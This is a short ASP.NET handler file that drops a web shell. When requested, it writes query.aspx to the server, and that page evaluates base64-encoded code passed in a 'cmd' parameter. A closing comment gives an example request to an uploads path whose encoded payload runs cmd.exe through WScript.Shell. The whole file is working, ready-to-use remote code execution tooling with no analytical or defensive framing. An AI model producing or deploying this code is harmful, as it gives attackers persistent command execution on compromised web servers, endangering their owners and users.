<%@ WebHandler Language="C#" Class="Handler" %> 
using System; 
using System.Web; 
using System.IO; 
public class Handler : IHttpHandler { 
    public void ProcessRequest (HttpContext context) { 
        context.Response.ContentType = "text/plain";
string show="<% @Page Language=\"Jscript\"%"+"><%Response.Write(eval(Encoding.UTF8.GetString(Convert.FromBase64String(Request.Item"+"[\"cmd\"]"+",\"unsafe\"))));%>";
        StreamWriter file1= File.CreateText(context.Server.MapPath("query.aspx")); 
        file1.Write(show); 
        file1.Flush(); 
        file1.Close();          
    }
    public bool IsReusable { 
        get { 
            return false; 
        } 
    } 
}

// execute command like below
// > https://site.com/uploads/query.aspx?cmd=dmFyIHNoZWxsID0gbmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsKdmFyIGNtZCA9ICJjbWQuZXhlIC9jIGRpciI7CnZhciBvdXRwdXQgPSBzaGVsbC5FeGVjKGNtZCkuU3RkT3V0LlJlYWRBbGwoKTsKb3V0cHV0Ow==
